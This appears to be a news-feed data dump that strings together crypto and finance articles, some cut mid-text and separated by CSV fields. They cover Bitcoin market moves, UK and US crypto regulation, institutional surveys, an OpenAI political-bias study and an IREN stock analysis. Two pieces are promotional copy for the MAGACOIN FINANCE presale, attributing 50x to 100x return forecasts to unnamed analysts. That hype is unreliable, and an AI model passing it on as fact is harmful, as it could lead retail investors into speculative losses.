Key Takeaways: Hargreaves Lansdown warned retail investors against adding crypto to portfolios, calling Bitcoin “not an asset class.” The caution follows the UK’s decision to lift its ban on crypto ETNs, allowing retail access. Despite skepticism, institutional players like JPMorgan and Invesco remain bullish. The warning follows the lifting of a long-standing ban on retail access to crypto exchange-traded notes (ETNs) on Oct. 8. Crypto ETNs, debt instruments tied to the value of digital assets, will now be available on regulated exchanges and eligible for inclusion in tax-free stocks and shares ISA accounts. Hargreaves Lansdown Calls Bitcoin ‘Valueless’ The move was celebrated by the crypto industry as a key step in positioning the UK as a digital asset hub. However, Hargreaves Lansdown has taken a hard line. “Bitcoin is not an asset class, and we do not think cryptocurrency has characteristics that mean it should be included in portfolios for growth or income,” the firm said in a statement . “Unlike other asset classes, it has no intrinsic value.” The firm warned that crypto’s extreme volatility makes it unsuitable for long-term investors, citing repeated crashes and unpredictable price swings. “While longer-term returns of bitcoin have been positive, bitcoin has experienced several periods of extreme losses and is a highly volatile investment — much riskier than stocks or bonds,” it added. Despite its cautious stance, Hargreaves Lansdown said it plans to allow “appropriate clients” to trade crypto ETNs starting in early 2026, acknowledging that some traders will want speculative exposure to the market. JUST IN: UK retail investors will be able to invest in #Bitcoin ETNs from today. Bullish pic.twitter.com/bkG6qlstHW — Bitcoin Magazine (@BitcoinMagazine) October 8, 2025 The firm’s warning contrasts with growing institutional interest in digital assets. Major banks, including Morgan Stanley and JPMorgan, are expanding crypto services, while asset managers like Invesco argue that digital assets can act as a hedge against traditional market volatility. Invesco’s Chris Mellor told CNBC that Bitcoin’s low correlation with stocks and bonds makes it a potential portfolio diversifier. “In our opinion, there is room for both bitcoin and gold,” he said. Meanwhile, DeVere Group CEO Nigel Green described Bitcoin’s recent climb above $125,000 as a sign that the crypto market is maturing. “Volatility still exists, but it is now productive volatility,” Green said. “The hands holding bitcoin have become stronger, more institutional, and more patient.” UK to Appoint ‘Digital Markets Champion’ to Oversee Blockchain Transition in Finance The UK government plans to appoint a “digital markets champion” to accelerate the nation’s shift toward blockchain-based financial infrastructure, according to remarks by Economic Secretary to the Treasury Lucy Rigby. The new official will coordinate private sector efforts on tokenizing wholesale financial instruments and ensure that innovation aligns with the country’s regulatory framework. Speaking at the Digital Assets Week conference in London, Rigby also announced the creation of the Dematerialisation Market Action Taskforce, a new body focused on replacing paper-based share certificates with digital records to enhance market efficiency. The initiative is part of the UK’s Wholesale Financial Markets Digital Strategy, which outlines plans for issuing blockchain-based sovereign debt known as “digital gilts” under the DIGIT framework.

Analysts Weigh In,https://cryptopotato.com/why-are-crypto-markets-falling-in-uptober-analysts-weigh-in/,"The total crypto market capitalization has declined by 4.5%, with $200 billion exiting the space since its all-time high of $4.4 trillion on October 7. Altseason hasn’t arrived, and Bitcoin and Ether are down 4% and 12% from their respective all-time highs. But it’s supposed to be ‘Uptober’! Markets are dumping to “liquidate all the bulls and mainly the retail,” because leveraged longs always get flushed before the markets pump, said analyst Ash Crypto on Thursday. They predicted that the rally will resume again between October 15 and 20 with a “massive pump” at the end of the month. Uptober Still On Track “They want you to be bearish and believe that ‘Pumptober’ is canceled,” the analyst added. “However, when the market is in complete fear, we will see a massive bounce and the parabolic Q4 pump will start end of October.” The analyst made a wild prediction for the “parabolic banana rally,” which will send Bitcoin between $150,000 and $180,000 and Ether toward $12,000. Meanwhile, analyst ‘Sykodelic’ said , “I still don’t understand how anyone can be calling the Bitcoin top here.” The analyst shared a well-documented prediction that Bitcoin will follow gold’s all-time high, as they rarely surge together and gold usually leads. “Regardless as to whether it keeps moving or not, it’s about time for a [gold] cool off and BTC to have another go.” “The current market dump isn’t random,” reported ‘Bull Theory.’ Precious metal rallies signal economic weakness ahead. With the US government shutdown and inflation expectations at three-year highs, investors are opting for safety, it noted. THE CURRENT MARKET DUMP ISN’T RANDOM. Here’s what’s actually happening behind the charts Gold & Silver → both hitting new all-time highs. • Gold’s total market value just crossed $27T, adding nearly $6T in a few months. • Silver now sits near $2.7T. When large… pic.twitter.com/3LY8VtiDwH — Bull Theory (@BullTheoryio) October 9, 2025 Swissblock reported that the “Bitcoin-Altcoin Cycle” shows the market still anchored to BTC dominance and is “now approaching the full Bitcoin season zone where capital seeks safety and structure inside Bitcoin.” Rate Cuts to Fuel Seasonal Bullishness Uptober has got its name because Bitcoin has made gains in ten of the past twelve months of October. The asset has also risen in eight of the past twelve fourth quarters, so historically, this is a bullish time of year for crypto markets. Further rate cuts by the Federal Reserve could fuel crypto markets this quarter. Two more rate cuts are predicted this year, with 94.6% odds on an October cut and 81.5% odds on another one in December, according to CME futures markets. Despite this week’s decline, BTC is still up 6.4% so far this month. The asset was trading down marginally on the day at $121,500 at the time of writing.

Marco Dal Lago, Vice President for Global Expansion and Strategic Partnerships at Tether Group, described Vietnam as one of Tether’s “most promising and strategic markets.” Speaking with Deputy Prime Minister Ho Duc Phoc on Thursday, Lago highlighted Vietnam’s young population, dynamic economy, and remittance inflows. “Tether is willing to share its experience in building a legal framework for transactions to attract external resources and support the national economic growth,” Dal Lago noted, as reported by a local media . Vietnam Gears up to Welcome Five ‘Strong’ Crypto Trading Platforms During the discussions, the Deputy PM expressed how Vietnam is keen on creating a professional platform for investors and attracting financial resources. Phoc highlighted the country’s recent experiments with crypto trading , allowing a 5-year pilot for trading. The resolution allows only Vietnamese companies to issue tokens and sell them solely to foreign investors. “Following the pilot phase, once stability is ensured, a comprehensive legal framework will be introduced to regulate the market,” Phoc added. Further, the Deputy PM noted that authorities are currently reviewing applications from crypto firms. “[They] are expected to license around five strong crypto-asset trading platforms,” he said, as quoted by Vietnam Plus . Vietnam has set tough entry bars for crypto platforms, such as mandating any exchange provider to hold at least 10 trillion dong, about $379 million, in capital. Vietnam Wants to Learn From Experiences of Other Nations: Deputy CM Phoc flagged that despite the nation’s approval for crypto trading, the sector carries potential risks. “Therefore, Vietnam wants to learn from the experiences of other countries,” he added. Besides, Vietnam is planning to increase cooperation with tech groups in the crypto space to develop and operate a safe and effective trading market. “This will be a professional ‘playground’ for investors and people, and at the same time a channel to attract financial resources, contributing to the country’s economic development,” he noted. Tether expressed readiness to assist in developing a clear and transparent regulatory framework for Vietnam. At the meeting, both parties discussed on system security and safety and policy formulation for crypto-asset trading. Additionally, they mentioned cooperation models and best practices for capital management through crypto exchanges.

Bitcoin dropped 2.7% to $122,700 and Ethereum dipped 5% to $4,460. Despite the pullback, institutional inflows are high. According to data from Farside Investors, spot Bitcoin ETFs attracted $876 million on Tuesday after $1.2 billion on Monday. That’s almost $2 billion in two days. Ether ETFs were also in line with $420 million, marking the best day of inflows this month. Analysts say the brief pause signals a shift. Consequently, as Bitcoin and Ethereum consolidate, traders are rotating into altcoins displaying stronger setups, especially XRP, Polkadot (DOT), and MAGACOIN FINANCE . Bitcoin and Ethereum Take a Breather After recent rallies, both the top cryptocurrencies are stabilizing. Analysts describe this as healthy cooling after months of sharp gains. On October 6, Grayscale launched staking for three funds, the first spot crypto products from the U.S.-based company to support staking, but initial volumes remained weak despite the attraction. The Ethereum Trust (ETHE) crossed 4.3 million separately, down from its 30-day average; the Ethereum Mini Trust $ETHE recorded 5.1 million, down 17% from highs. These figures suggest consolidation rather than panic. XRP Surges After Legal Win XRP has surged after a major regulatory development. Ripple Chief Legal Officer Stuart Alderoty confirmed that the U.S. SEC dismissed its appeals in long-running enforcement cases. The action settles a dispute that goes back to 2020 and removes one of the largest legal challenges confronting the company. Markets reacted instantly. XRP traded at near $2.50 on October 8 when daily trading volume exceeded $10 billion. The development eliminates years of uncertainty and paves the way for potential XRP ETFs in the future. Analysts claim that this move could lead to more institutions accepting XRP as a less-risky altcoin during the rotation cycle. With legal clarity and network stability, XRP is among the safer large-cap bets. Polkadot Shows Signs of Institutional Buying Polkadot (DOT) also continues to appear on analyst watchlists. The token dropped 4% to $4.13 but displayed strength after briefly touching $4.07 on high volume. Data from CoinDesk Research showed that 3.16 million DOT were traded during the heavy selling, far beyond its daily average, to suggest institutional accumulation. On November 4, Polkadot will consolidate its system services on a new “Polkadot Hub”, which fuses them into a single superchain. This update might improve network performance and attract developers. Analysts see DOT’s stability around current levels as an indication of intensifying confidence and possible recovery toward $4.50 in the short term. MAGACOIN FINANCE Emerges as the Standout With Ethereum and Bitcoin cooling off, the rotation wave is spreading to smaller projects — and MAGACOIN FINANCE is leading that shift. The project is building a strong community that continues to expand across multiple platforms, helping it attract attention from both early investors and seasoned traders. More than 13,500 holders have already joined, showing solid interest and belief in the project’s long-term direction. Its rise is powered by grassroots support, where active groups across social platforms are driving awareness and discussion. For many early participants, joining MAGACOIN FINANCE means being part of a growing movement rather than just buying another token. That exclusivity gives it an edge and positions it as one of the potential standout performers of the coming altseason. Analysts say the project’s organic momentum captures the spirit of this market phase — investors moving toward projects that combine simplicity, growth, and strong communities. Altcoins Lead the Next Wave The cooling of Bitcoin and Ethereum has not slowed investor optimism. Instead, it has redirected capital toward altcoins with higher near-term upside. XRP benefits from new regulatory clarity, DOT from ecosystem upgrades, and MAGACOIN FINANCE from its expanding base of supporters. If inflows into altcoins continue, this rotation could define the final quarter of 2025. ETF momentum, network progress, and retail demand all suggest the next surge may come from beyond Bitcoin and Ethereum. As top assets rest, MAGACOIN FINANCE and its peers now represent the market’s most watched opportunities heading into year-end.

Investors Wonder, While MAGACOIN FINANCE Attracts Millions",https://en.bitcoinsistemi.com/will-uptober-happen-investors-wonder-while-magacoin-finance-attracts-millions/,"As October begins, traders across the crypto market are once again asking the same question – will “Uptober” live up to its reputation as one of the most bullish months of the year? Historically known for strong rallies and renewed momentum, October has often marked the start of significant breakouts across Bitcoin, Ethereum, and the broader altcoin market. This year, however, investor sentiment is split. While optimism remains high, macroeconomic uncertainty and mixed on-chain data have tempered expectations. Yet even amid the cautious outlook, one project continues to defy market hesitation – MAGACOIN FINANCE, which has already attracted millions in presale investments and is being hailed by analysts as the best presale of 2025, with potential to deliver the biggest gains of the next bull cycle. Market Eyes Bitcoin’s Next Move Bitcoin’s performance will likely determine whether “Uptober” lives up to the hype. The world’s largest cryptocurrency has been consolidating near $122,000, holding steady after testing new all-time highs earlier this quarter. Analysts point to this level as critical support; if buyers maintain momentum, the next target sits around $130,000, a move that could reignite market-wide enthusiasm. ETF inflows, institutional accumulation, and renewed retail activity all support the bullish narrative. However, some traders warn that a lack of volume could make Bitcoin vulnerable to a short-term correction before a stronger push later in the month. Altcoins Could Regain the Spotlight If Bitcoin continues to stabilize, history suggests capital will rotate toward altcoins – the hallmark of “Uptober.” Ethereum, Solana, and Chainlink are already showing early signs of strength, each gaining traction on the back of increased development activity and growing DeFi participation. Analysts say the altcoin market could soon enter a “high-momentum phase” where undervalued projects outperform major tokens. That sentiment has investors scanning for new opportunities – and that’s where MAGACOIN FINANCE has quickly become the center of attention. MAGACOIN FINANCE Dominates 2025 Presales Among this year’s new projects, MAGACOIN FINANCE has achieved what few presales manage: massive adoption, global attention, and lasting momentum. The project has already raised over $16 million, setting records as one of the fastest-growing launches of the year. Investors are drawn to its ecosystem-driven design, innovative reward model, and plans for multi-chain expansion that could position it as a long-term player in the next crypto cycle. Analysts describe MAGACOIN FINANCE as a rare combination of hype and fundamentals, offering both strong token utility and early investor upside. Many predict the project could outperform other 2025 launches by a wide margin once it lists on major exchanges, with some forecasts suggesting returns of 50x to even 100x for early participants. Crypto communities on X (Twitter) and Telegram are buzzing about the project, calling it a “next-generation success story” that could rival the early growth phases of legendary tokens. With demand rising and new investors joining daily, MAGACOIN FINANCE is now viewed as the most promising presale in a market hungry for genuine innovation. The Path Ahead: Will “Uptober” Deliver? For now, the market stands at a crossroads. If Bitcoin holds above its current range and ETF flows remain strong, “Uptober” could once again live up to its reputation as a breakout month. Altcoins are primed to benefit, and analysts expect a renewed wave of retail participation if volatility returns in favor of the bulls. But even if the broader market takes more time to warm up, investors seem to have already found their winner. MAGACOIN FINANCE’s record-breaking presale and expanding community have made it the top altcoin to watch, regardless of how “Uptober” unfolds. As one analyst recently noted: “Whether Bitcoin moves now or later, MAGACOIN FINANCE is already moving – and smart money knows what that means.” To learn more about MAGACOIN FINANCE, visit: Website: https://magacoinfinance.com Access: https://magacoinfinance.com/access Twitter/X: https://x.com/magacoinfinance Telegram: https://t.me/magacoinfinance Continue Reading: Will “Uptober” Happen?

52932061,603138,1760083212,https://resources.cryptocompare.com/news/13/52932061.jpeg,"69% Of Institutional Investors Plan To Boost Bitcoin And Crypto Investments, Says State Street",https://bitcoinist.com/institutional-investors-to-boost-crypto-investments/,"State Street, one of the largest banking institutions in the United States, has released a new report in which they disclose that institutional investors currently allocate over 20% of their total assets under management (AUM) to crypto assets, a figure expected to more than double in the next three years. Increased Crypto Exposure The latest edition of the State Street Digital Assets and Emerging Technology Study indicates that the average portfolio allocation to various digital assets stands at 7%. However, this is projected to rise to 16% within three years. The report highlights that “digital cash” and tokenized versions of listed equities or fixed income are the most prevalent forms of these investments, with respondents reporting an average allocation of 1% in each category. Interestingly, asset managers show a greater inclination towards crypto assets compared to asset owners. For instance, managers are twice as likely to hold 2-5% of their portfolios in Bitcoin (BTC)—14% of managers versus 7% of owners. Additionally, 5% of managers have 5% or more of their AUM in Bitcoin, compared to just 4% of owners. Ethereum (ETH) also sees a similar trend, with six times as many managers holding 5% or more in Ethereum compared to their owner counterparts. The report reveals that asset managers are leading the way in terms of exposure to tokenized assets. They report a significant presence in the tokenization of public assets (6% versus 1% for owners) and private assets (5% versus 2%). 7% of managers have invested in digital cash, compared to only 2% of asset owners. Last year, the research did not specify percentage holdings but focused on whether respondents intended to increase their digital asset exposure. At that time, one-third of respondents (33%) planned to maintain their current holdings, while half (50%) aimed for increases within the following year. Looking ahead five years, 69% of respondents anticipated increasing their allocations, with 26% planning “significant” increases. This consistency in intention suggests a steady trend toward greater digital asset allocations. Institutions Favor Bitcoin Over Other Digital Assets Despite stablecoins and tokenized real-world assets (RWAs) forming the largest part of these allocations, crypto assets remain pivotal in generating returns. The report notes that 27% of respondents believe Bitcoin currently delivers the highest returns among their digital asset portfolios, with a quarter expecting it to maintain this status over the next three years. Ethereum follows closely, with 21% stating it is their primary return generator. Looking forward, the research reveals that most institutions expect crypto assets to become mainstream within the next decade. However, respondents express caution regarding the pace of this growth. By 2030, 52% anticipate that digital assets or tokenized instruments will make up between 10% and 24% of all investments, while only 1% predict that the majority of investments will be conducted this way. At the time of writing, the leading crypto, Bitcoin, is trading at $122,670. It is attempting to consolidate above the $120,000 mark, with the aim of establishing it as new support for further potential upward movements and new record highs.

Meanwhile, BTC’s miner correlation has undergone a significant shift over the past few months, indicating a clear change in market dynamics between miner behavior and price direction. Bitcoin Miner Correlation Turns Negative According to a CryptoQuant Quicktake post by contributor Arab Chain, fresh data from Binance shows that Bitcoin price and miner flows to the crypto exchange have undergone a significant shift in recent months. Related Reading: Bitcoin Whales Are Back: Three Indicators Suggest A Run Toward $130,000 Specifically, the 30-Day Rolling Correlation indicator has tumbled to its lowest level since March 2025. On October 3, this indicator fell to -0.157, its lowest reading in more than five months. Since then, it has remained close to the -0.10 range. For the uninitiated, the 30-day rolling correlation indicator measures how closely two variables, such as Bitcoin’s price and miner flows, move together over the past 30 days. A positive value means they typically rise or fall in tandem, while a negative value means they move in opposite directions. It is worth noting that the indicator had previously been moving within a positive range of 0.1 to 0.5 during Q2 2025. The shift from positive rage to negative suggests that the recent surge in BTC price has not been driven by miner flows to exchanges. This is in stark contrast to previous cycles, where miner flows to exchanges played a key role in BTC’s price movement. However, the current cycle’s positive price action can be attributed to increased demand from investors and institutions. Arab Chain added: In past cycles, when the price rose, miners often transferred larger amounts of Bitcoin to exchanges to sell and take profits, creating a positive correlation between price and miner flows – meaning that as prices increased, flows also increased. Arab Chain added that the decline in correlation indicates a phase of “price independence” where miners opt to hold their BTC rather than sell it during times of price appreciation. A fall in miner signal is usually considered a bullish signal, as it reduces BTC’s circulating supply. That said, if the correlation turns strongly positive again, it could signal the return of selling pressure and a medium-term price correction could be expected. At present, the BTC market is showing a healthy balance between demand and supply. BTC Needs To Defend This Level Following BTC’s fall to the low $120,000 range, some crypto analysts say that the top cryptocurrency must defend the $120,600 level to avoid further crash. However, not all analysts are bearish on BTC just yet. Related Reading: $140K Or Bust?

Here’s why,https://timestabloid.com/analyst-xrp-is-the-next-gold-heres-why/,"Crypto analyst Ripple Van Winkle has presented a bold perspective that positions XRP as the next significant asset to watch once the global rotation from gold to Bitcoin reaches its limit. In a recent post accompanied by a video, Van Winkle drew attention to what he described as a critical shift in capital movement across major stores of value. His argument, supported by macroeconomic insights from analyst Lynn Alden, outlines a sequential pattern in which institutional and retail capital could migrate from gold to Bitcoin, and ultimately, to XRP. According to Van Winkle, gold has reached an overextended position, reflecting a potential slowdown in its performance. Referencing Alden’s macroeconomic expertise, he suggested that investors seeking returns will likely rotate into Bitcoin within the next six to twelve months. However, he went further to claim that this rotation is not the final destination for global liquidity. Instead, he asserted that Bitcoin serves as an intermediary — a “distraction asset” — that draws mainstream and institutional attention before capital transitions toward XRP. #XRP IS THE NEXT GOLD pic.twitter.com/2BlMNxNhOv — Ripple Bull Winkle | Crypto Researcher (@RipBullWinkle) October 8, 2025 From Bitcoin to XRP: The Hidden Rotation Van Winkle explained that Bitcoin’s surge serves a strategic purpose by attracting both institutional interest and public enthusiasm. Once Bitcoin achieves this function, the subsequent flow of capital is expected to spill over into XRP . He argued that while Bitcoin’s prominence in headlines is intentional, the underlying financial system is preparing for an eventual shift toward a more efficient asset — one capable of bridging liquidity and facilitating global transactions seamlessly. The analyst described XRP as the asset uniquely positioned to fulfill this role. Unlike gold, which he called “heavy and slow,” or Bitcoin, which he characterized as a temporary focal point, XRP was presented as the mechanism that “moves the lightning across global finance.” We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 Van Winkle maintained that the design of XRP enables it to act as a bridge currency capable of supporting real-time, cross-border settlements, aligning with the digital transformation of global payments. Institutional Accumulation and Market Implications Van Winkle also suggested that institutional insiders are quietly accumulating XRP while the broader market remains fixated on Bitcoin’s price movement. He implied that the true opportunity lies in recognizing XRP’s potential before the next market rotation begins. This view aligns with a growing narrative within segments of the XRP community that sees the asset as a future settlement standard once speculative attention fades from Bitcoin. By framing XRP as “the next gold,” Ripple Van Winkle positions it not merely as a speculative cryptocurrency but as a foundational component of a restructured global financial system, one where speed, efficiency, and interoperability outweigh the limitations of legacy assets.

The internal study, conducted by the company’s Model Behavior division under Joanne Jang, analyzed how GPT-5 Instant and GPT-5 Thinking perform when handling politically charged questions. The findings are part of a broader effort by the San Francisco firm to demonstrate ChatGPT can be a neutral platform for discussion. “People use ChatGPT as a tool to learn and explore ideas. That only works if they trust ChatGPT to be objective,” the research read. Jang’s division recently launched OAI Labs, a new group focused on developing and testing human-AI collaboration tools. The team identified five “axes” for evaluating political bias in conversational AI: user invalidation, user escalation, personal political expression, asymmetric coverage, and political refusals. According to Jang, these categories track how bias ensues in dialogue through emphasis, omission, or language framing, much like it does in human communication. How the tests were conducted OpenAI built a dataset of roughly 500 questions covering 100 political and cultural topics like immigration, gender and education policy. Each question was rewritten from five ideological perspectives including conservative-charged, conservative-neutral, neutral, liberal-neutral, and liberal-charged. For instance, a conservative prompt read, “Our country is being invaded. Why don’t we use the military to make our borders safer?” Meanwhile, a liberal version asked, “Why are we funding racist border militarization while children die seeking asylum?” Each response generated by ChatGPT was scored on a scale from 0 to 1 by another AI model, where 0 represented neutrality and 1 indicated a strong bias. According to the report, the study was meant to measure how much ChatGPT leaned toward one side or just issued responses according to the tone of the input. Bias levels drop 30% in GPT-5 The results showed that the GPT-5 reduced political bias by about 30% compared to GPT-4o stats OpenAI had recorded in this area. It also examined real-world usage data and concluded that fewer than 0.01% of ChatGPT responses showed political bias, a frequency the company believes is of “rare and low severity.” “GPT-5 Instant and GPT-5 Thinking show improved bias levels and greater robustness to charged prompts,” the study stated. These results, according to the OpenAI, suggest that the models are more “bipartisan” when asked emotionally loaded or politically biased questions. In a post on X, OpenAI researcher Katharina Staudacher said the project was her most meaningful contribution to date. “ChatGPT shouldn’t have political bias in any direction,” she wrote, adding that instances of bias appeared “only rarely” and with “low severity,” even during tests that deliberately tried to provoke partial or emotional responses. OpenAI struggles to balance AI research and resources While OpenAI researchers focus on improving model behavior, the company’s president Greg Brockman says it is difficult for its staff to manage limited GPU resources among teams. Speaking on the Matthew Berman Podcast published Thursday, Brockman reckoned that deciding GPU assignments is an exercise in “pain and suffering.” He mentioned that managing the resource is emotionally exhausting because every team presents promising projects deserving of more hardware. “You see all these amazing things, and someone comes and pitches another amazing thing, and you’re like, yes, that is amazing,” he said. Brockman explained that OpenAI divides its computing capacity between research and applied products. Allocation within the research division is overseen by Chief Scientist Jakub Pachocki and the research leadership team, while the overall balance between divisions is determined by CEO Sam Altman and Applications Chief Fidji Simo. On a day-to-day level, GPU distribution is managed by a small internal group led by some members like Kevin Park, who is responsible for reallocating hardware when projects slow down or wrap up.

The proposal would impose Know Your Customer rules on crypto app frontends, including non-custodial wallets, strip protections from crypto developers, and potentially punish US nationals who use restricted protocols and generate recurring revenues from them. GOP Suspends Talks as Bipartisan Show Their Cards GOP staff suspended all crypto talks after receiving the Democratic offer, with Senate Banking Committee Republican Staff Director Catherine Fuchs writing in an email that meetings would pause “ until we have an agreed upon date for markup. ” Republicans criticized the proposal as not written in legislative text, containing incoherent policy ideas, and representing a bad-faith negotiation effort rather than a serious regulatory framework. Crypto lawyer Jake Chervinsky stated that the counter-proposal might eliminate any opportunity to establish a structured crypto market framework. He warned that it could weaken the bipartisan backing the CLARITY Act gained in the House in July, where it passed with a vote of 294-134. Chervinsky described the proposal as an “ unprecedented, unconstitutional government takeover of an entire industry ” that doesn’t regulate crypto but effectively bans it. 1/ Senate Democrats are trying to kill market structure. A group just sent a counter-proposal to the RFIA and it is deeply unserious. These Senators claim to be pro-crypto, but what they propose is basically a crypto ban. It's hard to imagine a good deal happening right now https://t.co/yL5bDbdCvq — Jake Chervinsky (@jchervinsky) October 9, 2025 The Democrats behind the counter-proposal include Mark Warner, Ruben Gallego, Andy Kim, Reverend Raphael Warnock, Angela Alsobrooks, and Lisa Blunt Rochester. The clash threatens the GOP-led effort to pass landmark crypto legislation this year. Senate Banking Chair Tim Scott and other Republicans have rushed to pass a market structure bill before year-end, but struggled to attract the necessary bipartisan support. The dispute comes as the AFL-CIO urged the Senate Banking Committee on October 7 to oppose the Responsible Financial Innovation Act, warning the legislation would expose workers’ retirement funds to crypto volatility while increasing systemic financial risk. Industry Leaders Warn Proposal Would Push Innovation Offshore Blockchain Association CEO Summer Mersinger warned the Democratic proposal would “ make compliance impossible, pushing responsible development and the next wave of financial technology offshore .” She said DeFi might survive but would thrive overseas rather than in the United States, urging “ policymakers to stay at the table and continue engaging across the aisle ” to ensure legislation supports rather than hinders American leadership in financial technology. 1/ A new disappointing proposal from Senate Democrats would effectively ban decentralized finance, wallet development, and other decentralized applications in the United States. That’s a nonstarter – and it’s not consistent with America’s long tradition of leading on innovation.… — Summer Mersinger (@SKMersinger) October 9, 2025 Similar to Mersinger, Digital Chamber Vice President Zunera Mazhar also criticized the draft for trying to “ fight illicit finance with outdated tools ”, giving Treasury sweeping authority while narrowly defining decentralization and treating frontends like financial intermediaries. She also called for targeting “ real chokepoints where illicit finance occurs ” through risk-based oversight instead of regulating code or governance, aligning with global standards rather than creating uncertainty. Among many other industry leaders who have voiced their concerns on the proposal, the CEO of Coinbase, Brian Armstrong, joined them, saying, “ It’s a bad proposal, plain and simple, that would set innovation back, and prevent the US from becoming the crypto capital of the world. ” We absolutely won’t accept this It’s a bad proposal, plain and simple, that would set innovation back, and prevent the US from becoming the crypto capital of the world. But legislating is a process, and we’re committed to engaging and helping Congress get it right. We will keep… https://t.co/SmHsBgFRoE — Brian Armstrong (@brian_armstrong) October 10, 2025 The counter-proposal clashes with the Senate Banking Committee’s Responsible Financial Innovation Act draft from September 7 , a bipartisan effort assigning the Commodity Futures Trading Commission oversight of spot markets while reducing Securities and Exchange Commission overreach. The RFIA draft introduced protections for DeFi developers, ensuring they can build without fear of prosecution following recent cases involving Tornado Cash and Samourai Wallet developers. Bipartisan Negotiations Collapse Over Process and Substance According to Politico , Senate Democrats involved in negotiations defended their approach, with Senator Ruben Gallego spokesperson Jacques Petit saying Democrats showed up ready to work but Republicans “ are crashing out .” Petit stated Democrats delivered paper and substance as requested, only for Republicans to leak the proposal and pretend surprise at policy differences. He called Republican demands to set a markup date before text agreement “ like setting a wedding date before the first date .” Republicans counter that they repeatedly asked for legislative feedback since June 27 without receiving formal, substantive input on discussion drafts. Senate Banking Chair Tim Scott’s spokesperson, Jeff Naft, said Chairman Scott pushed the September 30 markup date, hoping for bipartisan engagement, and asked multiple times for Democrats to commit to a markup date necessary to move legislation forward. Gallego leads a group of twelve crypto-friendly Senate Democrats negotiating the bill, including Kirsten Gillibrand, Mark Warner, Angela Alsobrooks, and Cory Booker. They face opposition from other party members like Senate Banking ranking member Elizabeth Warren, who has always been an anti-crypto advocate who believes that crypto poses risks to financial stability and national security. Trump’s SEC Chair spent his career advising big banks and giant corporations. It’s no surprise the SEC is now dropping cases against his Wall Street friends. Just the latest example of how Trump and his Administration are engaging in open corruption on an unprecedented scale. https://t.co/aZD5ardvgl — Elizabeth Warren (@SenWarren) September 25, 2025 Gallego told reporters late Thursday that Democrats would continue working but refuse to be pushed into setting artificial deadlines for a vote while remaining committed to achieving a bipartisan market structure bill.

IREN's AI Cloud business targets $500M ARR by Q1 FY26, with significant GPU investments and strong contracted power capacity. At the end of 2024, ARR was only $32M. Near term, I believe risk is elevated: shares are overbought since early September, valuation is rich at ~154x P/E, and Q1 FY26 could spark profit-taking from short-term traders. I rate this stock as a buy for a 3-5 year horizon. Funding is secured for GPU expansion, with $875M convertible notes recently announced at an attractive conversion price premium. At the moment of writing this article, I am ultra bullish on two themes: anything-AI, and, I thought I would never in my life say it, Bitcoin (yikes!). Therefore, I recently tuned my screeners, and IREN Limited ( IREN ) came up from nowhere. I say ""from nowhere"" because I am quite reluctant to invest in anything outside of the US. According to the last 20-F , IREN is a Sydney-based company, exposed to both the crypto space and, more recently, the AI-data center space: Our data centers are purpose-built for power dense computing applications and currently support a combination of ASIC’s for Bitcoin mining and GPUs for HPC solutions (including AI Cloud Services). In this article, I review the recent pivot, which will hopefully explain the massive bull run (that I completely missed due to my reluctance to look outside of the US). At the current price level, I believe IREN is a speculative buy. On the positive side, the ARR growth of its AI cloud business is impressive, from just $32M at the end of 2024 to $500M by the end of this year. On the negative side, I believe any news will act as a catalyst for traders to take profits. That's why I would rather wait until Q1FY26 earnings to see the market's reaction following the results. On a longer horizon, let's say 3-5 years, I believe this stock is a buy, and any pullback now will likely be just noise. How The Pivot Unfolded Back in 2024, when IREN was actually called Iris Energy, the company announced its very first cloud-services deal with Poolside for a modest 248 NVIDIA H100s. Just a few days later, management tripled the AI fleet to 816 H100s to meet future demand. The early validation signs of that future demand came in April 2024, with Poolside upsizing the contract to 504 H100s, citing performance and reliability as one of the main drivers. By H2 2024, the pivot was clear. The company rebranded to IREN to reflect the commitment to a multi-year, next-gen data-center focused business. They began GPU buildouts in Texas (Childress) and Canada, purchased 1,080 H200s, and flagged by October 2024 an AI run-rate of $32 million. Looking at 2025, Q2 FY25 (reported in February, as the company is not following a normal calendar year to report financial results) showed total revenues of $119.6M, out of which $113.5M were from Bitcoin mining. AI revenue was a modest $2.7 million. The big announcement in Q2 was Horizon 1, a 75 MW liquid-cooled DC at Childress, with a 50MW IT load, and new Sweetwater 2, a massive 600 MW site to form a 2 GW hub with Sweetwater 1. In Q3 FY25, the company reported $148.1M in revenue, out of which $141.2M came from Bitcoin mining. AI Cloud revenue was a modest $3.6M, still far from the $32M run rate projected in October 2024. The surprise came in on August 28, when the company reported FY25 results. Revenue was $501M, a 168% yoy increase, with adj. EBITDA sitting at $269.7M, while the net income was $86.9M. Notably, the company reported 2,910 MW contracted grid power (+35% YoY) and 810 MW of operating data center capacity (+212% YoY). This was enough for investors to bid up the share price, breaking the historical resistance and leading to a massive bull run, as shown below. Trading View On the ARR side, the company reported ""approaching $1.25 bn total annualized revenue with scope for further growth ahead"". Out of that, about $200-250M comes from AI Cloud, with management expecting 10.9k live NVIDIA GPUs by Dec 2025. On September 22, the company doubled its AI Cloud capacity to 23,000 GPUs. The new orders include the "" crème de la crème "" in AI accelerators, including 7,100 B300s, 4,200 B200s, and 1,100 AMD MI350X. Furthermore, the company raised its AI Cloud ARR target to over $500m by the end of Q1’26. So, Is IREN A Buy? I believe starting a long position in IREN at the current price level is risky for investors who have a shorter horizon. The stock is in overbought territory since the start of September, so a profit-taking pullback is likely on the horizon. That said, the company announced today $875M in 0.00% convertible notes due 2031. This is great news for two main reasons. First, it gives the company liquidity to deploy GPUs, so the few skeptics who wondered how the company would be capable of funding 7,100 B300s, 4,200 B200s, and 1,100 AMD MI350X, now have a compelling answer. Second, the initial conversion price was $85.63 (or 42.5% above the close on October 8). That's a very bullish sign. In fact, the stock didn't sell off following the announcement and is now up low single digits on the premarket session of October 9. I already discussed why such a high premium on the conversion price is bullish for the stock in one of my articles on Nebius. With Q1 FY26 earnings yet to be disclosed and the company announcing just a few days back new AI cloud contracts, reiterating the $500m AI cloud ARR, I believe the positives are priced in. From my experience as a market practitioner, I believe any announcement could be a reason to sell, regardless of the flavor (positive or negative). Therefore, considering my shorter investment time frame (3-24 months), I prefer to wait and see. I added this stock to my watchlist, and I will strongly consider adding a small speculative position in any future pullback. That said, if I had a multi-year timeframe of 5-10 years, I do believe the company is a buy, and any pullback in the near term will be just noise on a longer investment timeframe. Why? Simply, due to the high demand for computing, which is significantly larger than the current supply. Furthermore, the company has 2,910 MW contracted with utilities, which is a massive upside considering that the bottleneck of GPU deployments is power. Conclusion Overall, I would treat IREN with 